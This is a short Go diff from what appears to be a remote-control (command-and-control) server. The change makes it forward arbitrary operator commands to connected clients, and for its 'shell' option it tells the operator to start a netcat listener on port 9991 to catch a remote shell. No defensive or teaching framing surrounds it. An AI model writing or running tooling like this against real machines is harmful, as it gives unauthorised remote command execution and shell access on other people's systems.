@@ -54,11 +54,13 @@ func (server *Server) SendCommandToClient(client Client, input string, logger *L
         logger.ErrorLogger.Println("Error connecting to client socket:", err.Error())
     } else {
         if input != "shell" {
-            logger.ErrorLogger.Println("Error, command not found -> ", input)
+            // TODO: make it possible to add more than one command (i.e ls -la doesn't work)
+            clientConn.Write([]byte(input))
+            //logger.ErrorLogger.Println("Error, command not found -> ", input)
         } else {
             fmt.Println("Start your nc shell in another terminal (nc -lvvp 9991)")
             reader := bufio.NewReader(os.Stdin)
-            fmt.Printf("\nReady? > ")
+            fmt.Printf("\nReady? (yes/no) > ")
             input, err := reader.ReadString('\n')
             input = strings.TrimSpace(input)
 
